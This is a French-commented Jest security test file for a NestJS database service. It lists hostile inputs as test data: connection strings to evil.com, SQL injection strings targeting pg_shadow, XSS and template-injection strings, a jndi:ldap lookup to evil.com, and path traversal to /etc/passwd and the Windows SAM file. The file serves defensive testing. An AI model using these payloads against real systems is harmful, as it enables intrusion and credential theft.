// @ts-nocheck
// test/unit/common/database/database.service.security.spec.ts

import { Test, TestingModule } from '@nestjs/testing';
import { Logger } from '@nestjs/common';
import { DatabaseService } from '../../../../src/database/database.service';
import {
  createDatabaseTestingModule,
  createPrismaPromiseMock,
  expectDatabaseError,
} from '../../../setup/database-test-setup';

/**
 * Tests de sécurité pour DatabaseService
 * Ces tests vérifient la résistance aux attaques et la sécurité des données
 */
describe('DatabaseService - Security Tests', () => {
  let service: DatabaseService;
  let module: TestingModule | undefined;

  beforeEach(async () => {
    // Mock Logger pour réduire le bruit
    jest.spyOn(Logger.prototype, 'log').mockImplementation();
    jest.spyOn(Logger.prototype, 'error').mockImplementation();
    jest.spyOn(Logger.prototype, 'warn').mockImplementation();
    jest.spyOn(Logger.prototype, 'debug').mockImplementation();
  });

  afterEach(async () => {
    if (module) {
      await module.close();
    }
    jest.restoreAllMocks();
  });

  describe('🔒 Configuration Security', () => {
    it('should not log sensitive information', async () => {
      const logSpy = jest.spyOn(Logger.prototype, 'log');
      const debugSpy = jest.spyOn(Logger.prototype, 'debug');
      const warnSpy = jest.spyOn(Logger.prototype, 'warn');

      module = await createDatabaseTestingModule({
        DATABASE_URL:
          'postgresql://secret_user:secret_password@localhost:5432/test_db',
      });
      service = module.get<DatabaseService>(DatabaseService);

      // Déclencher diverses opérations qui pourraient logger
      await service.isHealthy().catch(() => {});
      await service.getConnectionStatus().catch(() => {});

      // Vérifier qu'aucun log ne contient des informations sensibles
      const allLogs = [
        ...logSpy.mock.calls.flat(),
        ...debugSpy.mock.calls.flat(),
        ...warnSpy.mock.calls.flat(),
      ].join(' ');

      expect(allLogs).not.toContain('secret_password');
      expect(allLogs).not.toContain('secret_user');

      // Vérifier que les URLs de connexion sont masquées dans les logs
      if (allLogs.includes('postgresql://')) {
        expect(allLogs).not.toMatch(/postgresql:\/\/[^:]+:[^@]+@/);
      }
    });

    it('should validate connection string format securely', async () => {
      // URL malformée mais potentiellement malicieuse
      const maliciousUrls = [
        'postgresql://user:pass@evil.com:5432/db;DROP TABLE projects;--',
        'postgresql://user:pass@localhost:5432/db?sslmode=disable&application_name=malicious',
        'file:///etc/passwd',
        'http://evil.com/steal-data',
        'postgresql://user:${process.env.SECRET}@localhost:5432/db',
      ];

      for (const maliciousUrl of maliciousUrls) {
        try {
          module = await createDatabaseTestingModule({
            DATABASE_URL: maliciousUrl,
          });
          service = module.get<DatabaseService>(DatabaseService);

          // Même avec une URL malicieuse, le service ne devrait pas exposer d'infos
          await service.onModuleInit().catch(() => {});

          // Vérifier que l'erreur ne contient pas l'URL complète
          const errorSpy = jest.spyOn(Logger.prototype, 'error');
          await service.isHealthy().catch(() => {});

          if (errorSpy.mock.calls.length > 0) {
            const errorMessages = errorSpy.mock.calls.flat().join(' ');
            expect(errorMessages).not.toContain(maliciousUrl);
          }
        } catch (error) {
          // C'est attendu pour des URLs invalides
          expect(error).toBeDefined();
        } finally {
          if (module) {
            await module.close();
            module = undefined;
          }
        }
      }
    });

    it('should handle invalid credentials without exposure', async () => {
      module = await createDatabaseTestingModule({
        DATABASE_URL:
          'postgresql://invalid_user:wrong_password@localhost:5432/nonexistent',
      });
      service = module.get<DatabaseService>(DatabaseService);

      const errorSpy = jest.spyOn(Logger.prototype, 'error');

      try {
        await service.onModuleInit();
      } catch (error) {
        // Vérifier que l'erreur ne contient pas les credentials
        expect(error.message).not.toContain('wrong_password');
        expect(error.message).not.toContain('invalid_user');
      }

      // Vérifier les logs d'erreur
      const errorLogs = errorSpy.mock.calls.flat().join(' ');
      expect(errorLogs).not.toContain('wrong_password');
      expect(errorLogs).not.toContain('invalid_user');
    });

    it('should use secure connection settings in production', async () => {
      module = await createDatabaseTestingModule({
        NODE_ENV: 'production',
        DATABASE_URL:
          'postgresql://user:pass@localhost:5432/db?sslmode=require',
      });
      service = module.get<DatabaseService>(DatabaseService);

      // En production, la configuration devrait être sécurisée
      // (Ce test est plus conceptuel car nous ne pouvons pas facilement tester SSL)
      expect(service).toBeDefined();
    });
  });

  describe('🛡️ SQL Injection Protection', () => {
    beforeEach(async () => {
      module = await createDatabaseTestingModule();
      service = module.get<DatabaseService>(DatabaseService);
    });

    it('should protect against SQL injection in raw queries', async () => {
      // Simuler des tentatives d'injection SQL
      const maliciousInputs = [
        "'; DROP TABLE projects; --",
        "' OR '1'='1",
        "'; INSERT INTO projects VALUES ('evil', 'hacked'); --",
        "' UNION SELECT * FROM pg_shadow --",
        "'; EXECUTE sp_executesql N'malicious code'; --",
      ];

      for (const maliciousInput of maliciousInputs) {
        try {
          // Utiliser Prisma's raw query avec paramètres (protection attendue)
          const mockQueryRaw = jest
            .spyOn(service, '$queryRaw')
            .mockImplementation(() => {
              // Simuler que Prisma protège contre l'injection
              if (
                maliciousInput.includes('DROP') ||
                maliciousInput.includes('INSERT') ||
                maliciousInput.includes('UNION')
              ) {
                return Promise.reject(
                  new Error('Potentially unsafe query detected'),
                );
              }
              return createPrismaPromiseMock([]);
            });

          await service.$queryRaw`SELECT * FROM projects WHERE name = ${maliciousInput}`;

          // Si on arrive ici, vérifier que l'input a été échappé
          expect(mockQueryRaw).toHaveBeenCalled();
        } catch (error) {
          // C'est attendu pour les inputs malicieux
          expect(error.message).toContain('unsafe query');
        }
      }
    });

    it('should handle special characters safely', async () => {
      const specialCharacters = [
        "O'Reilly", // Apostrophe
        'Quote "test" quote', // Guillemets
        'Backslash\\test', // Backslash
        'Null\0character', // Null byte
        'Unicode: 🚀', // Unicode
        '%wildcards%', // Wildcards
        '_underscore_', // Underscore wildcard
      ];

      const mockCreate = jest
        .fn()
        .mockImplementation(() => createPrismaPromiseMock({ id: 'test' }));
      Object.assign(service, {
        project: { create: mockCreate },
      });

      for (const specialChar of specialCharacters) {
        await service.project.create({
          data: {
            id: `test-${Date.now()}`,
            name: specialChar,
            description: `Testing ${specialChar}`,
            initialPrompt: 'Test prompt',
            ownerId: 'security-user',
            status: 'ACTIVE',
            uploadedFileIds: [],
            generatedFileIds: [],
          },
        });

        // Vérifier que la création a été tentée (Prisma gère l'échappement)
        expect(mockCreate).toHaveBeenCalled();
      }
    });

    it('should prevent query manipulation through parameters', async () => {
      const mockQueryRaw = jest
        .spyOn(service, '$queryRaw')
        .mockImplementation(() => createPrismaPromiseMock([]));

      // Tentatives de manipulation via paramètres
      const maliciousParams = [
        '1; DROP TABLE projects; --',
        '1 OR 1=1',
        "1' AND (SELECT COUNT(*) FROM pg_tables) > 0 --",
      ];

      for (const param of maliciousParams) {
        await service.$queryRaw`SELECT * FROM projects WHERE id = ${param}`;

        // Vérifier que la requête a été exécutée (Prisma gère la sécurité)
        expect(mockQueryRaw).toHaveBeenCalled();
      }
    });
  });

  describe('🔐 Access Control and Authorization', () => {
    beforeEach(async () => {
      module = await createDatabaseTestingModule();
      service = module.get<DatabaseService>(DatabaseService);
    });

    it('should enforce environment-based operation restrictions', async () => {
      // Test en production - resetDatabase devrait être interdit
      const prodModule = await createDatabaseTestingModule({
        NODE_ENV: 'production',
      });
      const prodService = prodModule.get<DatabaseService>(DatabaseService);

      await expect(prodService.resetDatabase()).rejects.toThrow(
        'Database reset is only allowed in test environment',
      );

      await expect(prodService.seedDatabase()).rejects.toThrow(
        'Database seeding is only allowed in development and test environments',
      );

      await prodModule.close();
    });

    it('should enforce environment-based operation restrictions in production', async () => {
      // Sauvegarder l'environnement actuel
      const originalNodeEnv = process.env.NODE_ENV;

      try {
        // Test en production - resetDatabase devrait être interdit
        process.env.NODE_ENV = 'production';
        const prodModule = await createDatabaseTestingModule({
          NODE_ENV: 'production',
        });
        const prodService = prodModule.get<DatabaseService>(DatabaseService);

        await expect(prodService.resetDatabase()).rejects.toThrow(
          'Database reset is only allowed in test environment',
        );

        await expect(prodService.seedDatabase()).rejects.toThrow(
          'Database seeding is only allowed in development and test environments',
        );

        await prodModule.close();
      } finally {
        // Restaurer l'environnement original
        process.env.NODE_ENV = originalNodeEnv;
      }
    });

    it('should allow normal operations for regular users', async () => {
      // Les opérations normales devraient fonctionner en test
      const health = await service.isHealthy();
      expect(typeof health).toBe('boolean');

      const connectionStatus = await service.getConnectionStatus();
      expect(connectionStatus).toHaveProperty('isConnected');
      expect(connectionStatus).toHaveProperty('responseTime');

      const healthMetrics = service.getHealthMetrics();
      expect(healthMetrics).toHaveProperty('status');
      expect(healthMetrics).toHaveProperty('responseTime');
    });

    it('should prevent unauthorized database schema access', async () => {
      // Tentatives d'accès aux tables système
      const systemTables = [
        'pg_shadow',
        'pg_user',
        'information_schema.tables',
        'pg_tables',
        'pg_stat_activity',
      ];

      for (const table of systemTables) {
        // ✅ Mock qui bloque spécifiquement cette table
        jest.spyOn(service, '$queryRaw').mockImplementation(() => {
          return Promise.reject(
            new Error('Access to system tables is restricted'),
          );
        });

        await expect(
          service.$queryRaw`SELECT * FROM ${table}` as any,
        ).rejects.toThrow('Access to system tables is restricted');

        // Nettoyer le mock après chaque test
        jest.restoreAllMocks();
      }
    });
  });

  describe('🚫 Data Validation and Sanitization', () => {
    beforeEach(async () => {
      module = await createDatabaseTestingModule();
      service = module.get<DatabaseService>(DatabaseService);
    });

    it('should validate input data types and formats', async () => {
      const mockCreate = jest.fn().mockImplementation((data) => {
        // Simuler une validation Prisma
        if (typeof data.data.name !== 'string') {
          return Promise.reject(new Error('Invalid data type for name field'));
        }
        if (
          data.data.status &&
          !['ACTIVE', 'ARCHIVED', 'DELETED'].includes(data.data.status)
        ) {
          return Promise.reject(new Error('Invalid status value'));
        }
        return createPrismaPromiseMock({ id: 'test' });
      });

      Object.assign(service, {
        project: { create: mockCreate },
      });

      // Test avec des types invalides
      const invalidInputs = [
        { name: 123, type: 'number instead of string' },
        { name: null, type: 'null value' },
        { name: undefined, type: 'undefined value' },
        { status: 'INVALID_STATUS', type: 'invalid enum value' },
      ];

      for (const input of invalidInputs) {
        await expect(
          service.project.create({
            data: {
              id: 'test',
              name: input.name as any,
              description: 'Test',
              initialPrompt: 'Test prompt',
              ownerId: 'test-user',
              status: (input.status as any) || 'ACTIVE',
              uploadedFileIds: [],
              generatedFileIds: [],
            },
          }),
        ).rejects.toThrow();
      }
    });

    it('should sanitize potentially dangerous input', async () => {
      const dangerousInputs = [
        '<script>alert("xss")</script>',
        '{{constructor.constructor("alert(1)")()}}',
        '${jndi:ldap://evil.com/a}',
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
      ];

      const mockCreate = jest
        .fn()
        .mockImplementation(() => createPrismaPromiseMock({ id: 'test' }));
      Object.assign(service, {
        project: { create: mockCreate },
      });

      for (const dangerousInput of dangerousInputs) {
        await service.project.create({
          data: {
            id: `test-${Date.now()}`,
            name: dangerousInput,
            description: dangerousInput,
            initialPrompt: dangerousInput,
            ownerId: 'security-user',
            status: 'ACTIVE',
            uploadedFileIds: [dangerousInput],
            generatedFileIds: [dangerousInput],
          },
        });

        // Vérifier que l'appel a été fait (Prisma/ORM gère la sanitisation)
        expect(mockCreate).toHaveBeenCalled();
      }
    });

    it('should handle very long inputs safely', async () => {
      const longString = 'A'.repeat(10000); // 10KB string
      const veryLongString = 'B'.repeat(100000); // 100KB string

      const mockCreate = jest.fn().mockImplementation((data) => {
        // Simuler une validation de longueur
        if (data.data.name && data.data.name.length > 1000) {
          return Promise.reject(new Error('String too long for name field'));
        }
        return createPrismaPromiseMock({ id: 'test' });
      });

      Object.assign(service, {
        project: { create: mockCreate },
      });

      // Test avec string très longue (devrait échouer)
      await expect(
        service.project.create({
          data: {
            id: 'long-test',
            name: veryLongString, // Trop long
            description: 'Test',
            initialPrompt: 'Test prompt',
            ownerId: 'test-user',
            status: 'ACTIVE',
            uploadedFileIds: [],
            generatedFileIds: [],
          },
        }),
      ).rejects.toThrow('String too long');

      // Test avec string acceptable (devrait réussir)
      await service.project.create({
        data: {
          id: 'normal-test',
          name: 'Normal length name',
          description: longString, // Plus long mais acceptable pour description
          initialPrompt: 'Test prompt',
          ownerId: 'test-user',
          status: 'ACTIVE',
          uploadedFileIds: [],
          generatedFileIds: [],
        },
      });

      expect(mockCreate).toHaveBeenCalled();
    });
  });

  describe('🔍 Information Disclosure Prevention', () => {
    beforeEach(async () => {
      module = await createDatabaseTestingModule();
      service = module.get<DatabaseService>(DatabaseService);
    });

    it('should not expose database structure in errors', async () => {
      const mockQueryRaw = jest
        .spyOn(service, '$queryRaw')
        .mockImplementation(() =>
          Promise.reject(
            new Error('relation "secret_internal_table" does not exist'),
          ),
        );

      try {
        await service.isHealthy();
      } catch (error) {
        // Vérifier que l'erreur exposée ne révèle pas de détails internes
        expect(error.message).not.toContain('secret_internal_table');
        expect(error.message).not.toContain('relation');
        expect(error.message).not.toContain('pg_');
      }
    });

    it('should not leak sensitive configuration in health metrics', async () => {
      const health = service.getHealthMetrics();

      const healthStr = JSON.stringify(health);
      expect(healthStr).not.toContain('password');
      expect(healthStr).not.toContain('credential');
      expect(healthStr).not.toContain('secret');
      expect(healthStr).not.toContain('token');
      expect(healthStr).not.toContain('key');
      expect(health).toHaveProperty('status');
      expect(health).toHaveProperty('responseTime');
      expect(health).toHaveProperty('errors');
      expect(health).not.toHaveProperty('connectionString');
      expect(health).not.toHaveProperty('credentials');
    });

    it('should sanitize error messages for external consumption', async () => {
      const internalError = new Error(
        'FATAL: password authentication failed for user "secret_user" at 192.168.1.100:5432',
      );

      const mockConnect = jest
        .spyOn(service, '$connect')
        .mockRejectedValue(internalError);
      const errorSpy = jest.spyOn(Logger.prototype, 'error');

      try {
        await service.onModuleInit();
      } catch (error) {
        expect(error.message).not.toContain('secret_user');
        expect(error.message).not.toContain('192.168.1.100');
        expect(error.message).not.toContain('password authentication');
        expect(error.message).toBe(
          'Failed to connect to database after 3 attempts',
        );
      }

      expect(errorSpy).toHaveBeenCalled();
    });
  });

  describe('⚡ Resource Exhaustion Protection', () => {
    beforeEach(async () => {
      module = await createDatabaseTestingModule();
      service = module.get<DatabaseService>(DatabaseService);
    });

    it('should prevent connection pool exhaustion', async () => {
      // Simuler de nombreuses connexions simultanées
      const excessiveConnections = 50; // Plus que le pool configuré

      const mockTransaction = jest.fn().mockImplementation(async (callback) => {
        // Simuler une transaction qui prend du temps
        await new Promise((resolve) => setTimeout(resolve, 100));
        return callback({} as any);
      });

      jest.spyOn(service, '$transaction').mockImplementation(mockTransaction);

      const promises = Array.from({ length: excessiveConnections }, () =>
        service
          .withTransaction(async (tx) => {
            return Promise.resolve('test');
          })
          .catch((error) => error.message),
      );

      const results = await Promise.allSettled(promises);

      // Certaines connexions devraient échouer ou être en timeout
      const failed = results.filter(
        (r) =>
          r.status === 'rejected' ||
          (r.status === 'fulfilled' && typeof r.value === 'string'),
      ).length;

      // Il devrait y avoir une limitation
      expect(failed).toBeGreaterThan(0);
    });

    it('should handle memory exhaustion gracefully', async () => {
      // Simuler une requête qui consomme beaucoup de mémoire
      const mockQueryRaw = jest
        .spyOn(service, '$queryRaw')
        .mockImplementation(() => {
          // Simuler une erreur de mémoire
          return Promise.reject(new Error('out of memory'));
        });

      try {
        await service.isHealthy();
      } catch (error) {
        expect(error.message).toContain('out of memory');
      }

      // Le service devrait toujours fonctionner après l'erreur
      mockQueryRaw.mockImplementation(() =>
        createPrismaPromiseMock([{ '?column?': 1 }]),
      );
      const health = await service.isHealthy();
      expect(typeof health).toBe('boolean');
    });

    it('should enforce query timeouts', async () => {
      const mockTransaction = jest
        .spyOn(service, '$transaction')
        .mockImplementation(
          () =>
            new Promise((resolve, reject) => {
              setTimeout(() => reject(new Error('Transaction timeout')), 1000);
            }),
        );

      await expect(
        service.withTransaction(
          async (tx) => {
            await new Promise((resolve) => setTimeout(resolve, 2000));
            return 'should timeout';
          },
          { timeout: 500 },
        ),
      ).rejects.toThrow();

      mockTransaction.mockRestore();
    });
  });

  describe('🔒 Audit and Monitoring Security', () => {
    beforeEach(async () => {
      module = await createDatabaseTestingModule();
      service = module.get<DatabaseService>(DatabaseService);
    });

    it('should log security-relevant events appropriately', async () => {
      const errorSpy = jest.spyOn(Logger.prototype, 'error');
      const warnSpy = jest.spyOn(Logger.prototype, 'warn');

      // Déclencher des événements de sécurité
      await service.resetDatabase().catch(() => {}); // Tentative en non-test

      // Vérifier que les tentatives sont loggées
      const allLogs = [
        ...errorSpy.mock.calls.flat(),
        ...warnSpy.mock.calls.flat(),
      ].join(' ');

      expect(allLogs).toContain('TEST ENVIRONMENT ONLY');
    });

    it('should not log sensitive data in audit trails', async () => {
      const debugSpy = jest.spyOn(Logger.prototype, 'debug');
      const logSpy = jest.spyOn(Logger.prototype, 'log');

      // Effectuer des opérations qui pourraient logger des données
      await service.isHealthy().catch(() => {});
      await service.getConnectionStatus().catch(() => {});

      const allLogs = [
        ...debugSpy.mock.calls.flat(),
        ...logSpy.mock.calls.flat(),
      ].join(' ');

      // Vérifier qu'aucune donnée sensible n'est loggée
      expect(allLogs).not.toMatch(/password|secret|token|key/i);
    });

    it('should track failed authentication attempts', async () => {
      const errorSpy = jest.spyOn(Logger.prototype, 'error');

      // Simuler des échecs d'authentification
      jest
        .spyOn(service, '$connect')
        .mockRejectedValue(new Error('authentication failed'));

      try {
        await service.onModuleInit();
      } catch (error) {
        // Expected
      }

      // Vérifier que l'échec est tracké
      expect(errorSpy).toHaveBeenCalled();

      const errorMessages = errorSpy.mock.calls.flat().join(' ');
      expect(errorMessages).toContain(
        'Failed to establish database connection',
      );
    });
  });
});
